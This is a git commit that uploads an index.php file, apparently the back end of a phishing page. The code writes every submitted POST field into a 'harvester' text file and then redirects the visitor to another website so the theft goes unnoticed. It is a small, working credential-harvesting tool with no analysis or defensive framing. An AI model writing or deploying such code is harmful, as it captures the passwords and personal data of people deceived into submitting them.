07649ade1ae499ca77ec51a5d0155e56e0e92b34
nowaay11 <nowaay11@gmail.com>
2018-09-17 19:16:20 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,2 @@
+<?php $file = 'harvester_2018-09-11 12:52:31.711774.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND); 
+/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=http://www.wbsite.com" />
